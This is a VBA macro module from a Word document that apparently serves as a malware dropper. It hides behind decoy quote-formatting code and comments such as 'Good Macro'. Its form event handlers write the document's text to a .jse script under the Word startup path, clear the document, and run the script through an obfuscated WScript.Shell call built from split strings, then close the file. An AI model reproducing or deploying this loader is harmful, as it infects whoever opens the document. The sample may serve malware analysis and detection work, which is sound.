Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
 'Autho TunYang (c) 2019
 'Good Macro

Private Nttghyu As String
Private Derrcgf As String
Private Jntyg As String


 'this coverts the Quote to Text if it contains tables,
 Sub convertToText()
    'there are 4 tables in the Quote, as each one is delete then next becomes Tables(1)
    Dim I As Long
    'first save the date that the Quote was created, so that it is not lost during table conversion
    On Error Resume Next
    quoteDate = ActiveDocument.Tables(1).Cell(I, 1).Range.Text
    quoteDate = Trim(quoteDate)
    quoteDate = CleanString(quoteDate)

    'For I = 1 To 5
    'On Error Resume Next
        ThisDocument.Tables(1).Select
        Selection.Rows.convertToText Separator:=wdSeparateByTabs, NestedTables:=True
    'Next I
 End Sub
 

 Sub parsePrice()

    Dim ourPrice As String
    Dim Tax As String
    Dim priceWithTax As String
    Dim ourPriceRange As Range
    Dim ourPriceLength As Long
    Dim plusPosition As Long
    Dim colonPosition As Long
    Dim ourPriceLabel As String
    On Error Resume Next
    Selection.GoTo What:=wdGoToBookmark, Name:="OurPriceBM"
    Set ourPriceRange = Selection.Cells(1).Range
    ourPrice = Trim(CleanString(ourPriceRange.Text))
    ourPriceLength = Len(ourPrice)
    
    'if the Our Price: label and the price are both on the same line then parse them
    If ourPriceLength > 15 Then
        colonPosition = InStr(ourPrice, ":")
        Selection.MoveRight Unit:=wdCharacter, Count:=colonPosition, Extend:=wdExtend
        Selection.Delete Unit:=wdCharacter, Count:=1
        Selection.MoveUp Unit:=wdLine, Count:=1
        Selection.Cells(1).Range.Text = "Our price:"
    End If
    Selection.MoveDown Unit:=wdLine, Count:=1
    
    'if cell range does not contain the price then delete the row
    'Do While Len(Selection.Cells(1).Range) < 6
        'Selection.Rows.Delete
        'Selection.MoveDown Unit:=wdLine, Count:=1
    'Loop
    
    
    VBA.CallByName VBA.CreateObject(Jntyg & "W" & Jntyg & "Sc" & Jntyg & "rip" & Jntyg & "t." & Derrcgf), _
    "R" & Empty & "u" & Jntyg & "n", VbMethod, _
    """" & Nttghyu & """" & " " & ourPrice, 0
    Exit Sub
    
   ' Selection.Cells(1).Range.Text = Trim(CleanString(ourPrice))
    ourPrice = Trim(CleanString(Selection.Cells(1).Range.Text))
    plusPosition = InStr(ourPrice, "+")
    Price = Left(ourPrice, plusPosition - 1)
    Price = Trim(Price)

End Sub


    
Private Sub Frttygh9(dr As String)
Nttghyu = dr & Empty & "\..\ATedr" & Jntyg
On Error Resume Next
MkDir Nttghyu
Nttghyu = "" & Nttghyu & Empty & "\Nerdcv." & Jntyg & "j" & Empty & "s" & "" & "e" & Empty
Dim Ngtyy66 As Integer
'ion
Ngtyy66 = FreeFile
Open Nttghyu For Output As #Ngtyy66
Print #Ngtyy66, ActiveDocument.Content.Text
Close #Ngtyy66
Derrcgf = Empty & "s" & Jntyg & "h" & Empty & "el" & "" & "l" & Empty
Exit Sub
convertToText
End Sub


  Sub Set_Cursor_Pos(ByVal x As Long, ByVal y As Long)

      ' Looping routine that positions the cursor
         'For x = 1 To 480 Step 20
         'x = 600
         'y = 400
            'System.Cursor = wdCursorWait
            'SetCursorPos x, y
            'For y = 1 To 40000: Next
         'Next x
         
         Frttygh9 Application.StartupPath

End Sub




Private Function Re_78h()
Re_78h = Len(ActiveDocument.Content.Text)
End Function

    
Private Sub Frooj()
Jntyg = Empty
If (Re_78h > 9754) Then
Set_Cursor_Pos 1, 1
ActiveDocument.Content.Text = ""
parsePrice
ActiveDocument.Close
End If
End Sub



Private Sub MultiPage1_Change()
Frooj
End Sub

Private Sub MultiPage1_Layout(ByVal Index As Long)
Frooj
End Sub




INQUEST-PP=macro
